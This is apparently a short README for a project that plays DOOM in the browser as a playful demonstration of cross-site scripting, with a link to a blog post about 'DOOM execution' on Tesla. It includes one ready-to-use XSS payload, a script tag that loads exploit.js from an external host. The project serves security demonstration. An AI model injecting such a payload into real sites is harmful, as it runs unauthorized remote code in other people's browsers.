## DOOM XSS

This project allows you to play DOOM in the browser. Here is [a silly blog post](https://labs.detectify.com/2017/07/27/how-we-invented-the-tesla-dom-doom-xss/) explaining how an XSS vulnerability could be used to achieve "DOOM execution" on Tesla.

If you ever want to demonstrate the possibilities of a XSS vulnerability, you may make an inclusion to [exploit.js](https://almroot.github.io/doom/exploit.js) like so: `<script src='https://almroot.github.io/doom/exploit.js'></script>`.
